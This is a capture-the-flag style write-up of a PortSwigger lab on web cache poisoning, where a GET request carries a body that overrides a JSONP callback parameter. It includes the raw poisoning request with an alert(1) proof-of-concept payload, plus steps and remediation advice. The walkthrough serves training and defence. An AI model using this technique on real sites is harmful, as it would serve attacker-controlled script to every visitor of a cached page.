# Lab 8: Web Cache Poisoning via a Fat GET Request

**Category:** Web Cache Poisoning
**Difficulty:** Practitioner
**Lab link:** [Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

## Overview

The cache keys only on the URL (method + path + query string) and ignores the request body. The backend, however, reads body parameters from GET requests when `Content-Length` is present. By sending a GET request with a body that overrides the `callback` parameter, the backend returns a poisoned JSONP response that the cache stores under the legitimate URL.

## Key Concepts

- **Fat GET request:** a GET request that includes a body. HTTP allows this but it is semantically undefined — many backends process the body parameters, while caches ignore them.
- **Body parameter override:** when both URL and body contain the same parameter, the backend typically uses the last value or body value. The cache only sees the URL value.
- **Cache/backend body blindness:** the cache does not include the body in the cache key, so a poisoned body-based response is served to all users of that URL.

## Solution

### Step 1 — Find the JSONP endpoint

`GET /js/geolocate.js?callback=setCountryCookie` returns `setCountryCookie({...})`.

### Step 2 — Add a body to the GET request

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: <lab>
Content-Type: application/x-www-form-urlencoded
Content-Length: 17

callback=alert(1)
```

### Step 3 — Confirm the override

Response body becomes `alert(1)({"countryCode":"..."})` — the body parameter overrode the query string.

### Step 4 — Poison the cache

Send until `X-Cache: hit`. The poisoned response is stored under `GET /js/geolocate.js?callback=setCountryCookie`.

### Step 5 — Verify

Visit the home page — it imports the script with `?callback=setCountryCookie`, gets the poisoned entry, fires `alert(1)`. Lab solved.

## Content-Length calculation

`callback=alert(1)` = 17 bytes. Must be exact — an incorrect Content-Length causes the backend to read a partial or over-extended body.

## Remediation

- Treat GET requests with bodies as malformed; reject or ignore the body.
- Include the request body in the cache key (or use `POST` with `no-store` for body-sensitive endpoints).
- Sanitise JSONP callback values: allow only `[a-zA-Z0-9_]`.

## Key Takeaways

- Fat GET requests exploit the semantic ambiguity of GET bodies — caches ignore them, backends often don't.
- No special headers or delimiters needed — just `Content-Length` and a body parameter.
- JSONP endpoints are particularly vulnerable because the callback is always reflected as executable code.
